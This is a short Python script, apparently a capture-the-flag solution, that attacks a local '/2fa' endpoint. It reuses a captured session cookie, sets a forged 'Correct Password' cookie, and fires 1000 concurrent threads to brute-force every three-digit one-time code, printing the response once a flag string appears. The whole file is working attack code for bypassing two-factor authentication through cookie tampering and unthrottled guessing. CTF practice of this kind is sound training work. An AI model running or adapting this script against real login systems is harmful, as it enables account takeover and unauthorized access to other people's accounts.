import requests
import threading

# --- Configuration ---
# To obtain your session cookie, log into the website with correct username ("admin") and any random password. A session cookie should be created which allows you to proceed to the /2fa endpoint. At the /2fa endpoint, run the below race condition script for exploitation. Replace 127.0.0.1:9999 with the real challenge url.

url = "http://127.0.0.1:9999/2fa"
session_cookie = "eyJ1c2VyIjoiYWRtaW4ifQ.aGwi9w.fOwBr4zKUicGZDeOFGh6_5BQTXw"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://127.0.0.1:9999/2fa",
    "Origin": "http://127.0.0.1:9999"
}

# Reusable function for each OTP guess
def try_code(code):
    s = requests.Session()
    s.cookies.set("session", session_cookie, domain="127.0.0.1")
    s.cookies.set("Correct Password", "True", domain="127.0.0.1")

    data = {"code": f"{code:03d}"}
    response = s.post(url, headers=headers, data=data, allow_redirects=True)

    if "sctf" in response.text:  # Adjust to your flag format
        print(f"[!] SUCCESS: Code {code:03d}")
        print(response.text)

# --- Threaded attack ---
threads = []
for i in range(1000):
    t = threading.Thread(target=try_code, args=(i,))
    threads.append(t)
    t.start()

# Join all threads
for t in threads:
    t.join()

print("All codes tested.")
